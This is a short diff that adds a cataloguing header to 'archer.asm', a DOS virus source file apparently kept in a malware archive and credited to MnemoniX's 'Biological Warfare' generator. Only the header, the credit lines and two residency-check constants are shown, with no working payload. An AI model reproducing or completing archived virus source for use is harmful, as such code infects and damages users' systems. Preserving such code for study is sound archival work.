@@ -1,5 +1,16 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; archer.asm : [Archer] MnemoniX `94
-; Created with Biological Warfare - Version 0.90� by MnemoniX
+; Created with Biological Warfare - Version 0.90� by MnemoniX
 
 PING            equ     0AE3Bh
 PONG            equ     0CD28h
